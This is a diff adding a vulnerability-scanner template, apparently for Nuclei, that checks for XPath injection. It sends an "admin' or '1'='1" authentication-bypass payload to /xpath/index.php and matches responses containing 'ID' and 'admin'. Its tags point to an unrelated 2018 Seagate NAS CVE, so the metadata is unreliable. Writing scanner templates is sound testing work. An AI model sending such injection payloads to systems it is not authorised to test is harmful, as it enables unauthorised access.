@@ -1,0 +1,29 @@
+id: xPath-Injection
+
+info:
+  name: xPath-Injection
+  author: xPath注入
+  severity: high
+  description: xPath injection vulnerability.
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
+    cvss-score: 7.5
+    cwe-id: CWE-200
+  tags: cve,cve2018,seagate,nasos,disclosure,xPath
+
+requests:
+  - raw:
+      - |
+        GET /xpath/index.php?name=admin' or '1'='1&pwd HTTP/1.1
+        Host: {{Hostname}}
+        Referer: {{BaseURL}}
+        
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'ID'
+          - 'admin'
+        condition: and
+
+# Enhanced by mp on 2022/07/05
